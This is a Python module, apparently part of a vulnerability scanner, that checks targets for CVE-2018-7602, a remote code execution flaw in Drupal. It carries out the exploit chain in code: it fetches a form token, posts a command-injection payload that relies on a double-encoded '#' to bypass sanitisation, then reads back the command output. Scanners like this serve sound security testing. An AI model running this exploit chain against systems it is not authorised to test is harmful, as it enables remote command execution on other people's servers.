#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
import re

def cve_2018_7602_scan(self, url):
    ''' 对URL中的#进行编码两次, 即可绕过sanitize()函数的过滤 '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2018-7602'
    vul_info['vul_method'] = 'POST'
    vul_info['headers'] = {}

    # headers = self.headers.copy()
    # headers.update(vul_info['headers'])

    for payload in range(len(self.cve_2018_7602_payloads)):
        path = self.cve_2018_7602_payloads[payload]['path']
        data = self.cve_2018_7602_payloads[payload]['data']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            if payload == 0:                                        # * 当payload为第1个时, 获取form_token
                form_token = self.get_form_token(target, vul_info)
                if (form_token):
                    continue
                else:
                    return None

            elif payload == 1:                                      # * 当payload为第2个时, 注入命令
                data = data.format(self.form_token)                 # * 添加form_token

                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)      # * LOG

                form_build_id = re.search(r'name="form_build_id" value="form-.{43}', res.text, re.I|re.M|re.U|re.S)
                if (form_build_id):
                    self.form_build_id = form_build_id.group().replace('name="form_build_id" value="', '')
                else:
                    return None

            elif payload == 2:                                      # * 当payload为第3个时, 查看回显
                target += self.form_build_id                        # * 添加form_build_id
                data += self.form_build_id

                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)      # * LOG


            # todo 判断
            if (self.md in check.check_res(res.text, self.md)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload-1': {
                        'Method': 'GET',
                        'Url': url,
                        'Path': self.cve_2018_7602_payloads[0]['path']
                    },
                    'Payload-2': {
                        'Method': 'POST',
                        'Url': url,
                        'Path': self.cve_2018_7602_payloads[1]['path'],
                        'Data': self.cve_2018_7602_payloads[1]['data'].format(self.form_token),
                    },
                    'Payload-3': {
                        'Method': 'POST',
                        'Url': url,
                        'Path': path,
                        'Data': data,
                    }
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
